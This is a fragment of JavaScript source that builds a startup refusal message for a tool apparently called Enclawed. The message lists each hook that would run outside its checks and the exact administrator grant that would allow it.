    "Not starting: hooks that would run outside Enclawed's checks are not granted.",
    ...refusals.map(
      (r) =>
        `  - ${r.scope} hook for ${r.event} in ${r.file}: ${r.why}${r.grant ? `. Review it; to start anyway, an administrator grants exactly this hook: ${JSON.stringify(r.grant)} (a changed hook needs a new grant)` : ""}`,
    ),
  ].join("\n");
}
